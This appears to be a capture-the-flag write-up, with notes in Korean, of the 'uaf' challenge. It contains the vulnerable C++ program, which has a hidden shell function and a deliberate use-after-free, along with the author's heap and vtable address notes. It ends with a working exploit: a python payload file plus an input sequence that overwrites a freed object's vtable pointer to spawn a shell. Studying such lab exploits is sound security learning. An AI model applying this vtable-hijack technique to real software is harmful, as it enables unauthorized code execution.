
\#include \<fcntl.h>
\#include \<iostream> 
\#include \<cstring>
\#include \<cstdlib>
\#include \<unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout \<< "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}


처음 1을 입력->3을 입력해서 free를 해보자

c25c50(이건 바뀜)->401570->40117a(HUMAN의 give_shell)인데, +8해서 401578->4012d2(MAN의 introduce) 후자가 실행된다.	
	3을 입력하면 c25c50이 401590->40117a 으로 바뀐 후, c25c50이 모두 지워져버린다.	 
c25ca0->401550->40117a(HUMAN의 give_shell)인데, +8해서 401558->401376(WOMAN의 introduce)이 실행된다. 
	이 또한, 3을 입력하면, c25ca0이 401590->40117a으로 바뀐 후, c25ca0이 모두 지워버린다.

1->3 delete하지 않고, 2를 할 경우
1->2 c25ca0보다 훨씬 뒤에 입력이 된다.
b40c50, b40ca0일때 -> b414e0 b41510
/tmp/file을 만드는 법
python -c 'print "AAAA"' > /tmp/file

1->3->2 c25ca0에 AAAA입력 된다. 1->3->2->2 c25ca0에 AAAA입력, c25c50에 AAAA입력
Use after free를 이용!!(free된 후, free된 부분에 덮어써진다.)
그러면 c25c50에 0x401568이 입력되면, +8인 0x401570이 실행되고, 0x40117a가 실행되어 쉘이 따진다!

python -c 'print "\x68\x15\x40"' > /tmp/file
./uaf 3 /tmp/file
1->3->2->2->1
